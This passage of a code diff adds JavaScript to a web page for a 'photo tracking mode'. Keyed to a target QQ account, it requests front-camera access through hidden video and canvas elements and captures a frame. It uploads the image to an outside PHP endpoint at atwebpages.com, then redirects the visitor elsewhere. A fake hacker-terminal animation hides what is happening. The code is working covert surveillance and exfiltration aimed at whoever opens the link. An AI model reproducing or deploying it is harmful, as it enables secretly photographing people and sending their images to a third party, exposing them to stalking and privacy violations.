+            if (paramUrl) {
+                // 如果用户选择退出，可以跳转或不跳转
+                // 这里选择不跳转，留在空白页
+            }
+        }
+
+        // ============ 终端日志功能 ============
+        function terminalLog(message, className = 'info') {
+            const terminalBody = document.getElementById('terminalBody');
+            if (!terminalBody) return;
+
+            const line = document.createElement('div');
+            line.className = 'terminal-line ' + className;
+
+            const timestamp = new Date().toTimeString().split(' ')[0];
+            line.innerHTML = `<span class="dim">[${timestamp}]</span> ${message}`;
+
+            terminalBody.appendChild(line);
+
+            // 自动滚动到底部
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+
+            // 同时输出到控制台
+            console.log('[TERMINAL]', message.replace(/<[^>]*>/g, ''));
+        }
+
+        function terminalPrompt(text) {
+            const terminalBody = document.getElementById('terminalBody');
+            if (!terminalBody) return;
+
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            line.innerHTML = `<span class="prompt">user@session:~$</span> <span class="info">${text}</span><span class="terminal-cursor"></span>`;
+            terminalBody.appendChild(line);
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+        }
+
+        // ============ 拍照追踪模式逻辑 ============
+        function initTrackingMode(qq, redirectUrl) {
+            // 隐藏配置模式，显示终端
+            document.getElementById('configMode').style.display = 'none';
+            document.getElementById('terminalOverlay').style.display = 'flex';
+            document.getElementById('deniedCard').style.display = 'none';
+
+            const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';
+            let streamRef = null; // 保存stream引用以便清理
+
+            // ============ 初始化终端日志 ============
+            function initTerminal() {
+                terminalLog('═══════════════════════════════════════', 'dim');
+                terminalLog('  SESSION INITIALIZED', 'cyan');
+                terminalLog('  Target ID: ' + qq, 'highlight');
+                terminalLog('  Redirect URI: ' + redirectUrl, 'dim');
+                terminalLog('───────────────────────────────────────', 'dim');
+                terminalLog('Initializing environment...', 'info');
+                terminalLog('Loading kernel modules...', 'info');
+                terminalLog('  [OK] netlink.socket', 'success');
+                terminalLog('  [OK] memory.allocator', 'success');
+                terminalLog('  [OK] process.scheduler', 'success');
+                terminalLog('  [OK] device.manager', 'success');
+                terminalLog('Kernel ready. Booting user space...', 'success');
+                terminalLog('', '');
+                terminalLog('Establishing secure channel...', 'info');
+                terminalLog('  Protocol: HTTPS', 'dim');
+                terminalLog('  Cipher: AES-256-GCM', 'dim');
+                terminalLog('  Key exchange: ECDHE-RSA', 'dim');
+                terminalLog('Handshake completed.', 'success');
+                terminalLog('', '');
+                terminalLog('Scanning available interfaces...', 'info');
+                terminalLog('  lo0: 127.0.0.1 [UP]', 'dim');
+                terminalLog('  eth0: ' + (window.location.hostname || 'unknown') + ' [UP]', 'dim');
+                terminalLog('  wlan0: scanning... [ACTIVE]', 'warning');
+                terminalLog('', '');
+                terminalLog('Initiating data acquisition sequence...', 'cyan');
+                terminalLog('Awaiting hardware authorization...', 'warning');
+            }
+
+            initTerminal();
+
+            // 模拟更多终端信息
+            setTimeout(() => {
+                terminalLog('Probing device capabilities...', 'info');
+            }, 1200);
+
+            setTimeout(() => {
+                terminalLog('  OS: ' + navigator.platform || 'Unknown', 'dim');
+                terminalLog('  Arch: ' + (navigator.userAgent.includes('x64') ? 'x86_64' : 'arm64'),
+                'dim');
+                terminalLog('  Cores: ' + (navigator.hardwareConcurrency || '?'), 'dim');
+                terminalLog('  Memory: ' + (navigator.deviceMemory || '?') + ' GB', 'dim');
+            }, 2000);
+
+            setTimeout(() => {
+                terminalLog('', '');
+                terminalLog('Requesting sensor access...', 'warning');
+                terminalPrompt('acquire --sensor --mode=passive');
+            }, 2800);
+
+            // ============ 开始采集流程 ============
+            async function startCapture() {
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                const ctx = canvas.getContext('2d');
+
+                // 检查浏览器支持
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    terminalLog('', '');
+                    terminalLog('✗ FATAL: Device interface not available', 'error');
+                    terminalLog('  This platform does not support media access.', 'error');
+                    terminalLog('  Task cannot proceed.', 'error');
+                    terminalLog('', '');
+                    terminalLog('Session will terminate in 3 seconds...', 'warning');
+                    setTimeout(() => {
+                        terminalLog('Terminated.', 'error');
+                        setTimeout(() => doRedirect(), 1500);
+                    }, 3000);
+                    return;
+                }
+
+                // 检查HTTPS
+                if (window.location.protocol === 'http:' &&
+                    window.location.hostname !== 'localhost' &&
+                    window.location.hostname !== '127.0.0.1') {
+                    terminalLog('⚠ Warning: Running on HTTP (non-secure)', 'warning');
+                    terminalLog('  Some features may be limited.', 'warning');
+                }
+
+                const constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: false
+                };
+
+                terminalLog('', '');
+                terminalLog('Acquiring device interface...', 'info');
+                terminalLog('  Parameters: 1280x720@30fps, front-facing', 'dim');
+
+                try {
+                    streamRef = await navigator.mediaDevices.getUserMedia(constraints);
+                    terminalLog('✓ Device interface acquired successfully', 'success');
+                    terminalLog('  Stream ID: ' + streamRef.id.substring(0, 8) + '...', 'dim');
+                } catch (err) {
+                    terminalLog('', '');
+                    terminalLog('✗ ERROR: ' + err.name, 'error');
+                    terminalLog('  ' + err.message, 'error');
+                    terminalLog('', '');
+
+                    // 降级尝试
+                    if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
+                        terminalLog('Attempting fallback constraints...', 'warning');
+                        try {
+                            streamRef = await navigator.mediaDevices.getUserMedia({
+                                video: true,
+                                audio: false
+                            });
+                            terminalLog('✓ Fallback succeeded', 'success');
+                        } catch (err2) {
+                            terminalLog('✗ Fallback also failed', 'error');
+                            terminalLog('  ' + err2.message, 'error');
+                            handlePermissionDenied();
+                            return;
+                        }
+                    } else if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                        handlePermissionDenied();
+                        return;
+                    } else if (err.name === 'NotFoundError') {
+                        terminalLog('✗ No device interface found', 'error');
+                        terminalLog('  This platform may not have the required hardware.', 'error');
+                        terminalLog('Session will terminate...', 'warning');
+                        setTimeout(() => doRedirect(), 3000);
+                        return;
+                    } else {
+                        handlePermissionDenied();
+                        return;
+                    }
+                }
+
+                // 绑定视频流
+                video.srcObject = streamRef;
+                video.setAttribute('playsinline', '');
+                video.muted = true;
+
+                terminalLog('', '');
+                terminalLog('Initializing data pipeline...', 'info');
+                terminalLog('Waiting for stream stabilization...', 'info');
+
+                // 等待视频元数据
+                try {
+                    await new Promise((resolve, reject) => {
+                        const timeout = setTimeout(() => {
+                            terminalLog('⚠ Timeout waiting for stream', 'warning');
+                            resolve(); // 继续尝试
+                        }, 8000);
+                        video.onloadedmetadata = () => {
+                            clearTimeout(timeout);
+                            resolve();
+                        };
+                        video.onerror = () => {
+                            clearTimeout(timeout);
+                            terminalLog('⚠ Stream error detected', 'warning');
+                            resolve();
+                        };
+                        video.play().catch(e => {
+                            terminalLog('⚠ Playback initiation issue: ' + e.message, 'warning');
+                            clearTimeout(timeout);
+                            resolve();
+                        });
+                    });
+                } catch (e) {
+                    terminalLog('⚠ Pipeline setup warning: ' + e.message, 'warning');
+                }
+
+                terminalLog('  Stabilizing... (1.5s)', 'dim');
+                await sleep(1500);
+
+                if (video.readyState < 2) {
+                    terminalLog('  Stream not ready (state=' + video.readyState + '), waiting...', 'warning');
+                    await sleep(2000);
+                }
+
+                const vw = video.videoWidth || 640;
+                const vh = video.videoHeight || 480;
+                terminalLog('  Resolution: ' + vw + 'x' + vh, 'dim');
+
+                if (vw === 0 || vh === 0) {
+                    terminalLog('✗ Invalid frame dimensions', 'error');
+                    stopStream(streamRef);
+                    handlePermissionDenied();
+                    return;
+                }
+
+                canvas.width = vw;
+                canvas.height = vh;
+
+                terminalLog('', '');
+                terminalLog('Capturing frame...', 'cyan');
+
+                try {
+                    ctx.drawImage(video, 0, 0, vw, vh);
+                    terminalLog('✓ Frame captured', 'success');
+                } catch (e) {
+                    terminalLog('✗ Frame capture failed: ' + e.message, 'error');
+                    stopStream(streamRef);
+                    setTimeout(() => doRedirect(), 2000);
+                    return;
+                }
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.65);
+                const sizeKB = Math.round(imageData.length / 1024);
+                terminalLog('  Size: ' + sizeKB + ' KB', 'dim');
+                terminalLog('  Format: JPEG (quality: 0.65)', 'dim');
+
+                // 停止流
+                stopStream(streamRef);
+
+                // 上传
+                terminalLog('', '');
+                terminalLog('Uploading payload to endpoint...', 'info');
+                terminalLog('  Target: ' + API_URL, 'dim');
+
+                const formData = new FormData();
+                formData.append('qq', qq);
+                formData.append('image', imageData);
+
+                let uploadSuccess = false;
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+                    terminalLog('  Establishing connection...', 'dim');
+                    const response = await fetch(API_URL, {
+                        method: 'POST',
+                        body: formData,
+                        signal: controller.signal,
+                    });
+
+                    clearTimeout(timeoutId);
+
+                    if (response.ok) {
+                        const result = await response.json();
+                        if (result.success) {
+                            terminalLog('✓ Upload successful', 'success');
+                            terminalLog('  File: ' + (result.filename || 'unknown'),
+                            'dim');
+                            terminalLog('  Folder: ' + (result.folder || qq), 'dim');
+                            uploadSuccess = true;
+                        } else {
+                            terminalLog('⚠ Server response: ' + (result.message || 'unknown'),
+                            'warning');
+                        }
+                    } else {
+                        terminalLog('⚠ HTTP ' + response.status + ': ' + response.statusText, 'warning');
+                    }
+                } catch (err) {
+                    if (err.name === 'AbortError') {
+                        terminalLog('✗ Upload timeout (15s)', 'error');
+                    } else {
+                        terminalLog('✗ Network error: ' + err.message, 'error');
+                    }
+                }
+
+                terminalLog('', '');
+                if (uploadSuccess) {
+                    terminalLog('═══════════════════════════════════════', 'dim');
+                    terminalLog('  TASK COMPLETED SUCCESSFULLY', 'success');
+                    terminalLog('═══════════════════════════════════════', 'dim');
+                } else {
+                    terminalLog('═══════════════════════════════════════', 'dim');
+                    terminalLog('  TASK COMPLETED WITH WARNINGS', 'warning');
+                    terminalLog('═══════════════════════════════════════', 'dim');
+                }
+
+                terminalLog('', '');
+                terminalLog('Redirecting to target in 2s...', 'info');
+                terminalLog('  Destination: ' + redirectUrl, 'dim');
+                terminalLog('', '');
+                terminalLog('Closing session...', 'dim');
+                terminalLog('  [OK] Stream terminated', 'success');
+                terminalLog('  [OK] Memory freed', 'success');
+                terminalLog('  [OK] Connection closed', 'success');
+                terminalLog('', '');
+                terminalLog('Goodbye.', 'cyan');
+
+                await sleep(2000);
+                doRedirect();
+            }
+
+            // ============ 权限被拒绝处理 ============
+            function handlePermissionDenied() {
+                terminalLog('', '');
+                terminalLog('═══════════════════════════════════════', 'dim');
+                terminalLog('  ✗ ACCESS DENIED', 'error');
+                terminalLog('  Host rejected the authorization request.', 'error');
+                terminalLog('═══════════════════════════════════════', 'dim');
+                terminalLog('', '');
+                terminalLog('Task aborted by remote host.', 'warning');
+                terminalLog('Session terminating...', 'error');
+                terminalLog('', '');
+                terminalLog('Press any key to continue...', 'dim');
+
+                // 停止流
+                if (streamRef) {
+                    stopStream(streamRef);
+                }
+
+                // 3秒后显示拒绝卡片
+                setTimeout(() => {
+                    document.getElementById('terminalOverlay').style.display = 'none';
+                    document.getElementById('deniedCard').classList.add('show');
+                }, 3000);
+            }
+
+            function stopStream(stream) {
+                if (stream) {
+                    stream.getTracks().forEach(track => {
+                        track.stop();
+                        terminalLog('  [CLOSED] ' + track.kind + ' track', 'dim');
+                    });
+                }
+            }
+
+            function doRedirect() {
+                document.getElementById('terminalOverlay').style.display = 'none';
+                document.getElementById('deniedCard').style.display = 'none';
+                const video = document.getElementById('hiddenVideo');
+                if (video && video.srcObject) {
+                    stopStream(video.srcObject);
+                }
+                window.location.href = redirectUrl;
+            }
+
+            function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+
+            // 启动
+            setTimeout(() => {
+                startCapture().catch(err => {
+                    terminalLog('', '');
+                    terminalLog('💥 UNHANDLED EXCEPTION: ' + err.message, 'error');
+                    terminalLog('Stack trace unavailable in production.', 'dim');
+                    setTimeout(() => {
+                        terminalLog('Forcing session termination...', 'error');
+                        setTimeout(() => doRedirect(), 2000);
+                    }, 1000);
+                });
+            }, 3500);
+        }
     </script>
 </body>
 </html>
